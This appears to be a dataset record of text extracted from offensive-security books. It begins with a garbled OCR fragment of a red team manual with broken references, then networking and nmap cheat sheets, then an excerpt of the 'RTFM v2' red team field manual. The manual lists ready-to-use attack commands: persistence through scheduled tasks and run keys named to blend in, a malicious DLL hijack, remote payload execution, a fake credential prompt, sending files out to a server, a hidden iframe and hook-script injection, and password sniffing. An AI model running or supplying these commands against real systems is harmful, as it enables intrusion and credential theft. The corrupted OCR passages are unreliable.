\")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4) I\n# Add iptables rule to block attack box from sending RSTs\nSYN=ip/TCP(rport=RandNum(6000,-000),dport=BO,flags=\"S\",seq=4)\nACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags=\"A\",seq=SYNACK.ack,ack=SYNACK.\nProto= \u00b7\"tcp\",PeerAddr= \u00b7 11 12-:'.0.0.l\",PeerPort= $port);\njhttps://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm\n[1] t1ubix. Linux/Unix/BSD Post-Exploitation Command List.\n[2] Tomes, Tim. Safely DGmping Hashes from Live Domain Controllers.\nflcto~g_l_cigtcorr.:._\u00b7 com/1..QlUll.Lsafel\u00b7r-dumping-hashes-_from-li v. html. Accessed\nll!J~..Q_; __ L.L\u00a3.\u00a3D_t_~_.\u00a7_~nhQI'~\u00a7..:L__!_net /cheat-\nsheet/shells/reverse-shell-cheat-sheet. Accessed on 15 Nov 2012.\nhtto://bernardodame 1 e.blogscat.com/2Jll/09/reverse-shel-s-one-liners.html.\n[5] SANS Institute. IEE 802.11 Pocket Reference Guide.\nhttc://www.willhac}:forsushi.com/paoers/80211 Pocket Reference Guide.pdf.\n[6] Tomes, Tim. Remote t1alware Deployment and a Lil' AV Bypass.\nhttp://oauldotcom.com/2012/C51remote-malware-deplo\u00b7;ment-and.html. Accessed\nhttos://\\Jww.trusredsec.com/dow~loads/tools-downloadi. Accessed on 25 Jan\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nmodification, are permitted prov~ded that the following conditions are met:\nRedistributions in binarJ form must reproduce the above copJright notice,\nand/or other materials provided with the distribution.\nOF t1ERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAit1ED.\nthose of the authors and should not be interpreted as representing official\npolicies, either expressed or implied, of TRUSTEDSEC, LLC.\n[8] SSL and stunnel. httc://www.J:ioptrix.com/blcq/?o=68-. Accessed on 01\nh t to:/ /blog. spider labs. com /:2 012/0 6/usinq-nrnao-to-screenshot -'deb-\n[10] ''Schtasks Persistence with PowerShell One Liners''.\nhttc://blog.strategicc\u00b7\u00b7ber.com/2013/11/09/schtasl:s-oers~stence-with-\n__ ~.:::-__ L+. .. ners_/_. Accessed on 21 Nov 2013.\nNmap's script categories include, but are not limited to, the\nauth: Utilize credentials or bypass authentication on target\nbroadcast: Discover hosts not included on command line by\nbrute: Attempt to guess passwords on target systems, for a\nvariety of protocols, including http, SNMP, IAX, MySQL, VNC,\ndefault: Scripts run automatically when -sC or -A are used.\ndiscovery: Try to learn more information about target hosts\nthrough public sources of information, SNMP, directory services,\ndos: May cause denial of service conditions in target hosts.\nexternal: Interact with third-party systems not included in\nfuzzer: Send unexpected input in network protocol fields.\nintrusive: May crash target, consume excessive resources, or\notherwise impact target machines in a malicious fashion.\nmalware: Look for signs of malware infection on the target\nsafe: Designed not to impact target in a negative fashion.\nversion: Measure the version of software or protocol spoken\nExample: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254\n--exclude  --excludefile file exclude host or list from file\n--traceroute: trace path to host (for topology map)\n--max-os-tries set the maximum number of tries against a target\n--resume file resume aborted scan (from oN or oG output)\nnmap -T4 --max_rtt_timeout 200 --initial_rtt_timeout 150 --min_hostgroup 512 --max_retries 0 -n -P0 -p80\nnmap -sP -PE -PP -PS21,23,25,80,113,31339 -PA80,113,443,10042 --source-port 53 -T4\nnmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all\nnmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO --traceroute\n--script-trace print incoming and outgoing communication\nIANA port assignments published at http://www.iana.org/assignments/port-numbers\nWhat To Type Into Search Box (& Description of Results)\nconference site:www.sans.org (Search SANS site for conference info)\nplasma television $1000...1500 (Search for plasma televisions between $1000 and $1500)\nhockey date: 3 (Search for hockey references within past 3 months; 6 and 12-month date-\nsafesearch: sex education (Search for sex education material without returning adult sites)\nlink:www.sans.org (Find pages that link to the SANS website)\ninfo:www.sans.org (Find information about the SANS website)\nrelated:www.stanford.edu (Find websites related to the Stanford website)\nintitle:conference (Find pages with \"conference\" in the page title)\nallintitle:conference SANS (Find pages with \"conference\" and \"SANS\" in the page title.\ninurl:conference (Find pages with the string \"conference\" in the URL)\nallinurl:conference SANS (Find pages with \u201cconference\u201d and \"SANS\" in the URL.\nfiletype:ppt (Find files with the \"ppt\" file extension.\ncache:www.sans.org (Show the cached version of the page without performing the search)\nphonebook:Rick Smith MD (Find all phone book listing for Rick Smith in Maryland.\nauthor:Rick (Find all newsgroup postings with \"Rick\" in the author name or email address.\ninsubject:Mac OS X (Find all newsgroup postings with \"Mac OS X\" in the subject of the\ndefine:sarcastic (Get the definition of the word sarcastic)\nstock:AAPL (Get the stock information for Apple Computer, Inc.)\nUse this sheet as a handy reference that outlines the\nvarious Google searches that you can perform. It is\nreference guide and refresher on all Google advanced\noperators used in this course. The student could also\nhttp://www.google.com/intl/en/help/refinesearch.html\nSend packets much faster at layer two using tcpreplay\nsr1(pkt, inter=0, loop=0, count=1, iface=N), srp1(\u2026)\nRecord packets off the wire; returns a list of packets when stopped\n>>> sendp(Ether()/IP(dst=\"192.0.2.1\")/UDP(dport=53))\n>>> srloop(IP(dst=\"packetlife.net\")/ICMP(), count=3)\nMatches a host as the IP source, destination, or either\nMatches a host as the Ethernet source, destination, or either\nMatches packets to or from an endpoint residing in network\nMatches TCP or UDP packets to/from a port in the given range\nMatches 802.11 frames based on type and optional subtype\nMatches 802.1Q frames, optionally with a VLAN ID of vlan\nMatches MPLS packets, optionally with a label of label\nip nat outside source static 174.143.212.133 10.0.0.47\nip nat outside source static 174.143.213.240 10.0.2.181\n! Create an access list to match inside local addresses\nip nat pool MyPool 192.0.2.1 192.0.2.254 prefix-length 24\n! Dynamic translations can be combined with static entries\nip nat inside source static tcp 10.0.0.3 8080 192.0.2.1 80\nip nat inside source static udp 10.0.0.14 53 192.0.2.2 53\nip nat outside source static tcp 174.143.212.4 23 10.0.0.8 23\nip nat inside source list 11 interface FastEthernet1 overload\nip nat pool LoadBalServers 10.0.99.200 10.0.99.203 prefix-length 24 type rotary\n! Enable load balancing across inside hosts for incoming traffic\nip nat inside destination list 12 pool LoadBalServers\nResource Reservation Protocol (RSVP) is used to reserve bandwidth per-\nPackets are individually classified and marked; policy decisions are made\nThe first three bits of the IP TOS field; limited to 8 traffic classes\nThe first six bits of the IP TOS are evaluated to provide more granular\nclassification; backward-compatible with IP Precedence\nThe individual QoS action performed at each independent DiffServ node\nTrust Boundary \u00b7 Beyond this, inbound QoS markings are not trusted\nTail Drop \u00b7 Occurs when a packet is dropped because a queue is full\nImposes an artificial ceiling on the amount of bandwidth that may be\nconsumed; traffic exceeding the policer rate is reclassified or dropped\nSimilar to policing but buffers excess traffic for delayed transmission;\nmakes more efficient use of bandwidth but introduces a delay\nClass Selector (CS) \u00b7 Backward-compatible with IP Precedence values\nAssured Forwarding (AF) \u00b7 Four classes with variable drop preferences\nExpedited Forwarding (EF) \u00b7 Priority queuing for delay-sensitive traffic\nFlows adjust TCP window sizes in synch, making inefficient use of a link\nVariable-length subnet masks are an arbitrary length\nbetween 0 and 32 bits; CIDR relies on VLSMs to define\nFlow Label (20 bits) \u00b7 Identifies unique flows (optional)\nPayload Length (16 bits) \u00b7 Length of the payload in bytes\nNext Header (8 bits) \u00b7 Header or protocol which follows\nHop Limit (8 bits) \u00b7 Similar to IPv4's time to live field\nDestination Address (128 bits) \u00b7 Destination IP address\nAnycast \u00b7 An address configured in multiple locations\nCarries additional information which must be examined by every\nIncluded when a packet has been fragmented by its source\nCarries additional information which pertains only to the recipient\nTransporting IPv4 and IPv6 across an infrastructure simultaneously\nIPv6 traffic is encapsulated into IPv4 using IPv6-in-IP, UDP (Teredo),\nor Intra-Site Automatic Tunnel Addressing Protocol (ISATAP)\nStateless IP/ICMP Translation (SIIT) translates IP header fields, NAT\nProtocol Translation (NAT-PT) maps between IPv6 and IPv4 addresses\n*OUFSOFU\u00014FDVSJUZ\u0001\"TTPDJBUJPO\u0001\u0007\u0001,FZ\u0001.BOBHFNFOU\u00011SPUPDPM\u0001\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n(Number of bytes in entire datagram including header;\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\nISC@sans.org     \u2022     www.sans.org     \u2022    http://isc.sans.org\nC O U R S E S  &  G I A C  C E R T I F I C A T I O N S\n\u2022  Have your college send sealed transcripts to STI\n0    1    2    3    4    5    6    7    8    9    0    1    2    3    4    5\n(No. of name server resource records in Authority section)\n(No. of resource records in Additional Information section.\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\nType Name/Codes (Code=0 unless otherwise specified)\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\nvalue = 5 (20 bytes) & maximum value = 15 (60 bytes)\nPosition of this fragment in the original datagram,\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\nNumber of 32-bit words in TCP header; minimum value = 5\nECN-Echo (1 = receiver cuts congestion window in half)\nU (1 = Consult urgent pointer, notify server application\nSwitch(config-if)# switchport trunk encapsulation dot1q\nSwitch(config-if)# switchport trunk allowed vlan 10,20-30\nSwitch(config-if)# ip address 192.168.100.1 255.255.255.0\nGenerates and propagates VTP advertisements to clients;\nReceives and forwards advertisements from servers; VLANs\ncannot be manually configured on switches in client mode\nForwards advertisements but does not participate in VTP;\nVLANs not having any access ports on an end switch are\nSwitch(config)# vtp mode {server | client | transparent}\n8000 discrete signal measurements are taken at equal intervals every second\nThe level of each sample is rounded to the nearest expressible value\nDigital values are encoded as binary numbers for encapsulation\nThe digital signal is compressed in real time to consume less bandwidth\nOriginally designed for multimedia transmission over ISDN; mature\nText-based, similar in nature to HTTP; defined in RFC 3261; peer-\nEmploys centralized call control; defined in RFC 3661\nCisco-proprietary; limited support on gateways; centralized control\nThe phone retrieves its configuration from one of the\nThe phone registers with the call server(s) specified\nThe physical area covered by the wireless signal of a BSS\nA set of stations and/or access points which can directly\nThe wired infrastructure connecting multiple BSSs to form an ESS\nA set of multiple BSSs connected by a DS which appear to wireless\nAn isolated BSS with no connection to a DS; an ad hoc WLAN\nAn expression of signal strength as compared to a reference signal;\ndBm \u00b7 Signal strength compared to a 1 milliwatt signal\ndBi \u00b7 Compares forward antenna gain to that of an isotropic antenna\nA MAC address which serves to uniquely identify a BSS\nA human-friendly text string which identifies a BSS; 1-32 characters\nCarrier Sense Multiple Access/Collision Avoidance (CSMA/CA)\nThe mechanism which facilitates efficient communication across a\nNet signal strength (transmitter power + antenna gain - cable loss)\nVariable spacing calculated to accommodate differing\nExtended delay imposed after errors are detected in a\nnew generation of hardware to implement significantly\nKeys are manually distributed among clients and APs\nClients authenticate the AP via PKI, then form a secure\ntunnel inside which the client authentication takes\nA proposal by Cisco, Microsoft, and RSA which employs\na secure tunnel for client authentication like EAP-TTLS\nDirectional \u00b7 Radiates power in one focused direction\nA Wi-Fi Alliance certification for QoS; a subset of\nQoS markings in the 802.1Q header on wired Ethernet\nThese patterns are intended for reference purposes and have not been extensively tested.\nPlease use with caution and test thoroughly before use."}
{"source": "book", "book": "Books", "file": "RTFM Red Team Field Manual v2 -- Ben Clark & Nick Downer.pdf", "text": "RTFM v2. Copyright \u00a9 2022 by Ben Clark and Nick Downer\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any\nmeans, without prior written permission of the copyright owner.\nProduct and company names mentioned herein may be the trademarks of their respective owners.\nRather than use a trademark symbol with every occurrence of a trademarked name, the author uses\nthe names only in an editorial fashion, with no intention of infringement of the trademark. Use of a\nterm in this book should not be regarded as affecting the validity of any trademark or service mark.\nThe information in this book is distributed \"as is\". While every precaution was taken to ensure the\naccuracy of the material, the author assumes no responsibility or liability for errors or omissions, or\nfor damages resulting from the use of the information contained herein\nConvert Windows Registry HEX Format To Readable ASCII\nLoop Through IP List, Download File Over HTTP & Execute\nCommands and syntax are provided in a \u201ctable\u201d format, and variables in\ncommands are denoted as bold, italic, and surrounded by brackets.\nschtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR\nAn operator must change the variable <FILE_PATH> to equal the full path\nof the uploaded file, and change <IP_ADDRESS> to equal the IP address\nCorrectly modifying the above command for execution may look like:\nschtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR\nMany of the commands listed in this book may have other modifiable\narguments. For example, in the command listed above, operators may also\nmodify the name of the task by modifying the TN value. These types of\nreplacements and modifications are not required but could be valuable to\nSome commands may have \u201cplaceholder\u201d variables added which make\nunderstanding the functionality of the command easier. For example, in the\nExplanation: \u201cConnect to remote IP address, listen on ALL\nlocal IP addresses on port 8080, traverse SSH tunnel, and\nThe IP addresses and ports were left in the command, to better describe its\nCommands were tested on the following updated operating systems:\nMore info at: exploit-db.com/google-hacking-database\nvulnerabilityassessment.co.uk/Penetration%20Test.html\npentest-standard.org/index.php/Intelligence_Gathering\nThis section details important Windows operating system information\nacross many different versions such as: Windows XP, 7, 10, 11, and\nWindows Server. Details in this section include version number and dates\nreleased, administrative binary information, environmental variables,\nNote: Windows 10 versions include Home, Pro, Education, Enterprise,\nPro for Workstations, Pro Education, Windows 10 S, and Windows 10\nNote: Windows servers include Windows Server Essentials, Windows\nWindows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)\nWindows Server 2008 (Foundation, Standard, Enterprise)\nWindows 7 (Starter, Home, Pro, Enterprise, Ultimate)\nWindows Server 2008 R2 (Foundation, Standard, Enterprise)\nWindows 8 (x86/64, Pro, Enterprise, Windows RT (ARM))\nWindows Server 2012 (Foundation, Essentials, Standard)\n%USERPROFILE%\\Appdata\\Roaming\\Microsoft\\Windows\\Start\nList of registry keys accessed during system boot (in load order):\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\nStart value of 0 = Kernel Drivers (Load before Kernel initiation)\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler\nNote: Some of these keys are also reflected under HKLM\\Software\\WOW6432Node on\nNote: Windows Sysinternals Autoruns is an excellent utility to inspect and monitor\nauto-starting locations on Windows. Available at https://technet.microsoft.com/en-\nThis section details important and useful system enumeration commands\nthat can be used to query important operating system, user, and even remote\nHKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /v\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Wordpad\\Recent\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\nHKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit /v\nwmic /node: <IP_ADDRESS> computersystem get username\nwmic /node: <IP_ADDRESS> /user:<DOMAIN>\\<USERNAME> /password:\n<PASSWORD> process call create \"\\\\<IP_ADDRESS>\\<SHARE_FOLDER>\\\nwmic /node: <IP_ADDRESS> process list brief /every:1\nreg query \\\\<IP_ADDRESS>\\<REG_HIVE>\\<REG_KEY> /v <REG_VALUE>\nsysteminfo /S <IP_ADDRESS> /U <DOMAIN>\\<USERNAME> /P\nnet use * \\\\<IP_ADDRESS>\\<SHARE_FOLDER> /user:<DOMAIN>\\\n<IP_ADDRESS>\\HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nThis section details useful techniques pertaining to data mining files and documents from\nWindows computers. This section covers finding files of interest, compression, various tree\n<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\nThree separate options to \u201ctree\u201d a filesystem to file on a host, compress it,\n* If any copies already exist then skip creation command\nThis section details important and useful commands that can be used to execute payloads on remote\nsystems. Proper administrative credentials must be held to run many of the commands listed below.\nUpload binary to remote machine, modify existing service to point at that binary, start the service, and\nre-configure the service binpath back to its original value. VSS is a service that works great for this\ntechnique, but other services can work if they meet the requirements listed in the right column below.\nUpload binary to remote machine system folder and execute via MMC COM execution. Set the proper\nremote IP and uploaded binary path in the command below and execute via powershell.exe. FILEPATH\n([activator]::CreateInstance([type]::GetTypeFromProgID(\u201cMMC20.Application\u201d,\u201d<IP_ADDRESS>\u201d))).\nDocument.ActiveView.ExecuteShellCommand(\u201c<FILE_PATH>\u201d,$null,$null,\u201d7\u201d)\nUpload binary to remote machine, create scheduled task pointing at that\nbinary, run task, and delete task. Can change \u201cOfficeUpdater\u201d to any\nschtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>\nMicrosoft Windows Active Directory is a service that combines large\ngroups of computing resources into one centralized hierarchical system.\nThis system is comprised of user accounts, computers, objects, active\ndirectory forests, and more. Centralized authentication makes\nadministration and expansion of computing resources much easier.\nAn Active Directory forest is a collection of parent/child domains and is\nused to share authentication between domains, while keeping those domain\nIf an organization called Corp has a Chicago and San Diego office, they\nmay choose to create a forest made up of a parent domain, and two child\nThis type of object is a \u201ccontainer\u201d that can include other\nobjects. This can be useful if a company wants to further\ncontainerize objects such as putting all accounting users\nWindows hashes are NOT salted. Password re-use is very common\nfor users that have multiple user accounts in different domains.\nDomain Service account passwords may not be changed often.\nCertain \u201cEnterprise Admin\u201d accounts may be used to traverse\nDomains should utilize separation of privilege. Workstation\nAdmins administer workstations, SQL Admins administer SQL\nThis section details important and useful domain enumeration commands.\nThese commands can display computers, users, groups, etc.\nNet.exe will NOT list groups in groups. Refer to DSQuery section to\nwevtutil qe security /rd:true /f:text /q:\"*[System/EventID=4624]\n[EventData/Data[@Name='TargetUserName']='<USERNAME>']\"\ndsquery * -filter \"(description=*<USER_LAST_NAME>*)\" -attr\nThis section covers re-configuration of Windows which can be used to further a potential\nred team assessment. A few examples include enabling remote desktop protocol, adding\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes\n<IP_ADDRESS>\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal\nServer\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f\nnetsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1\nnetsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1\nreg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t\nwmic product where name=\"XXX\" call uninstall /nointeractive\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\"\nnet share sharename=<SHARE_FOLDER> /GRANT:everyone,FULL\nMore info at: https://forensicswiki.xyz/wiki/index.php?\nThis section details important and useful user level persistence techniques.\nSince they are \u201cuser level\u201d they do not require any administrative\nprivileges and most of them execute on user log in.\nUpload binary and add scheduled task pointing at that uploaded binary.\nCan change OfficeUpdater to a task name that blends into target system.\nUpload binary and add run key value pointing at uploaded binary. Can\nchange OfficeUpdater to run key value that blends into target system.\nUpload binary to a specific \u201cstartup\u201d folder. All files in this folder are executed on user login.\n%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n%SystemDrive%\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start\n%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\n%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup\nEnumerate all user persistence methods discussed in this section looking for existing persistence\nthat has been created via script files such as .bat, .ps1, etc. If those are modifiable by a basic user,\nmodify them to launch a malicious uploaded payload. Just beware, if the script is on a file server\nThis section details important and useful SYSTEM level persistence\ntechniques. Since they are \u201cSYSTEM\u201d they will require administrative\nprivileges and most of them execute during system startup.\nUpload binary to system folder and create scheduled task pointing at that\nbinary for execution. Can change OfficeUpdater to a different task name\nUpload binary to folder and create service pointing at that binary. Can\nchange the service description and display name to blend into the target\nUpload malicous.dll named WptsExtensions.dll (works with default\nCobalt Strike .dll) anywhere in system path, reboot machine, and the\nschedule service will load the malicious WptsExtensions.dll\nUpload malicous.dll named \"WptsExtensions.dll\" to folder in PATH\nReboot target computer (Schedule service will load WptsExtensions.dll\nRemove uploaded WptsExtensions.dll to remove persistence\nNote: Many .dll hijacks exist on Windows systems and a simple Google\nsearch should list all the vulnerable filenames, services, and even contain\nexamples of how to execute a given .dll hijack technique on a system.\nThis section details various PowerShell and Batch script examples. Some of\nthese examples enumerate system information, cause system effects, or aid\n$ports=(<PORT>,<PORT>,<PORT>);$ip=\"<IP_ADDRESS>\";foreach ($port in $ports){try{$socket=New-\nobject System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket \u2013eq $NULL){echo $ip\":\"$port\" \u2013\nClosed\";}else{echo $ip\":\"$port\" \u2013 Open\";$socket = $NULL;}}\n$ping = New-Object System.Net.Networkinformation.ping;$ping.Send(\"<IP_ADDRESS>\",500)\npowershell \u2013WindowStyle Hidden \u2013ExecutionPolicy Bypass $Host.UI.PromptForCredential(\"\n<WINDOW_TITLE>\",\"<MESSAGE>\",\"<USERNAME>\",\"<DOMAIN>\")\npowershell \u2013Command \"do {if ((Get-Date \u2013format YYYYMMDD-HHMM) \u2013match \u2018202208(0[8-9]|1[0-1])-\n(0[8-9]|1[0-7])[0-5][0-9]\u2019){Start-Process \u2013WindowStyle Hidden \"<FILE_PATH>\";Start-Sleep \u2013s\n$password = convertto-securestring \u2013string \"<PASSWORD>\" \u2013asplaintext \u2013force;\n$pp = new-object \u2013typename System.Management.Automation.PSCredential \u2013argumentlist \"<DOMAIN>\\\nStart-Process powershell \u2013Credential $pp \u2013ArgumentList \u2018-noprofile \u2013command &{Start-Process\nSend-MailMessage \u2013to \"<EMAIL>\" \u2013from \"<EMAIL>\" \u2013subject \"<SUBJECT>\" \u2013a \"\n<FILE_ATTACHEMENT>\" \u2013body \"<BODY>\" \u2013SmtpServer \"<IP_ADDRESS>\" -Port \"<PORT>\" -\npowershell \u2013noprofile \u2013noninteractive \u2013Command 'Invoke-WebRequest -Uri \"https://<URL>\" -OutFile\nScript will send a file ($filepath) via http to server ($server) via POST request.  Must have web server\n\u2018[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$server=\"\"\"http://<URL>\"\"\"; $filepath=\"\"\"<FILE_PATH> \"\"\"; $http = new-object System.Net.WebClient;\nGet-WmiObject -class win32_operatingsystem | select -property * | export-csv <FILE_PATH>\n[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()\nNew-PSDrive -Persist -PSProvider FileSystem -Root \\\\<IP_ADDRESS>\\<SHARE_FOLDER> -Name i\nGet-ChildItem -Path <FILE_PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where\nIf executing script from a batch file, variables must be preceded with %\nThis section details various post exploitation tools and techniques such as\nmimikatz, PsExec, privilege escalation tactics, file system redirection, etc.\nMore info at: https://book.hacktricks.xyz/windows-hardening/stealing-\nEnumerate all File Servers in a domain and net view to find\nopen shares. Once all shares are located, enumerate all share\nfiles/folders for sensitive data such as: administrative info,\ncredentials, user home directories, etc. Repeat against other\nsystems in the domain (other server roles like database, web,\netc.) which may have misconfigured network shares exposing\nRun open-source tool \"SharpUp\" to enumerate potential\nprivilege escalation opportunities such as vulnerable paths,\nEnumerate startup folder, user scheduled tasks, etc. Attempt\nto poison global shared scripts set to run at login.\nGain access to administrative shares and attempt to poison\nscripts run by administrators or macro enabled files.\nFile System Redirection - > Jump to x64 process from x86\nExecute x64 binary: C:\\Windows\\Sysnative\\upnpcont.exe\nUse tasklist to list processes and find the PID of the\nThis section details Mac OS version information and general file system\nlayout. There are many similarities between Mac OS and Linux, but there\nThis section details system enumeration and user/group manipulation\ncommands. It is worth noting user management and authentication in Mac\nOS is accomplished much differently than Linux. Shadow/Passwd files are\nnot used and user information is stored in \u201c.plist\u201d files.\nAs mentioned above, Mac OS stores user information (including user\npassword hashes) in files called property lists (.plist). With administrative\ncredentials, these can be directly enumerated, and user hashes can be\n/var/db/dslocal/nodes/Default/users/<USERNAME>.plist\nkryptonite:$6$n4wLdmr59pt.......:18912:0:99999:7:::\nFirst three characters of the hash list the hash type\nNote: */etc/login.defs contains the shadow configuration.\nPassword (x: password in shadow file, *: user cannot use login)\nEnumerate all persistence methods discussed in this\nsection looking for existing persistence that has been\ncreated via script files such as .sh, .py, etc. If those are\ncat <FILE_PATH> | grep -Eo \"(http|https)://[a-zA-Z0-9./?=_%:-]*\" |\nmount.cifs //<IP_ADDRESS>/<SHARE_NAME> /mnt/share \u2013o\nCopy the contents of id_rsa.pub to target remote machine's\ntcpdump port http or port ftp or port smtp or port imap or port\n'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=\n|password=|pass:|user:|username:|password:|login:|pass |user '\ntcpreplay --oneatatime --verbose -i eth0 <INPUT_PATH>.pcap\nMore info at: https://danielmiessler.com/study/tcpdump/\nNote: In the table below, any reference to \u201cCtrl+a\u201d == Control-a\nIptables is a robust firewall and packet filter program typically installed\nby default on Linux systems. Iptables can be configured to perform\nseveral actions on network packets as they arrive and leave a Linux\nsystemctl list-unit-files --type=service | grep httpd\nMore info at: https://www.calculator.net/ip-subnet-calculator.html\nMore info at: https://github.com/vanhauser-thc/thc-ipv6\nMost commands below show the various prompts at which the commands\nare executed. For example: #, (config)#, (config-if)#, etc. Most of these\nMore info at: https://github.com/darkoperator/dnsrecon\nhttps://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm FCC ID lookup\nhttp://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide\nKeywords found in user agent strings aid in identifying\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\">\nvar commandModuleStr = '<script src=\"' + window.location.protocol + '//'\n+ window.location.host + ':<PORT>/<URI_TO_HOOK.JS> \"\n<iframe src=\"<URI/URL>\" width=\"0\" height=\"0\" frameborder=\"0\"\ntabindex=\"-1\" title=\"empty\" style=visibility:hidden;display:none\"> </iframe>\nwget \u2013q \u2013-save-cookies=<OUTPUT_PATH> \u2013-keep-session-cookies \u2013-post-\ndata=\"username:<USERNAME>&password=<PASSWORD>&Login=Login\"\ncurl -I -X HEAD -A \"Mozilla/5.0 (compatible; MSIE 7.01;\nWitnessMe is a tool that takes screenshots of webpages using Pyppeteer.\nMore info at: https://github.com/byt3bl33d3r/WitnessMe\nMore info at: https://www.stationx.net/wireshark-cheat-sheet/\ncontent/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp\nBy default, this module will create a notepad.exe process and inject into\nNote: If running on Kali check out /usr/share/wordlists for rockyou and\ndataFormatHex = bytearray.fromhex(sys.argv[1]).decode()\nmessage = re.findall(r'<message>(.?)>/message>', data,re.DOTALL)\n# Create SSL cert (follow prompts for customization)\n# openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 \u2013\nwith socketserver.TCPServer(server_address, handler) as httpd:\nhttpd.socket = context.wrap_socket(httpd.socket, server_side=True)\nserver.sendmail('<FROM_EMAIL>', '<TO_EMAIL>', text)\n#Sample syntax: python test.py -t 127.0.0.1-2 -p 8000 -d 1\nparser.add_option(\"-t\", dest=\"iprange\",help=\"target IP range, i.e.\nparser.add_option(\"-p\", dest=\"port\",default=\"80\",help=\"port,\nparser.add_option(\"-d\", dest=\"delay\",default=\".5\",help=\"delay (in\nips.append('%s.%s.%s.%d' % (octets[0],octets[1],octets[2],i))\nresponse = 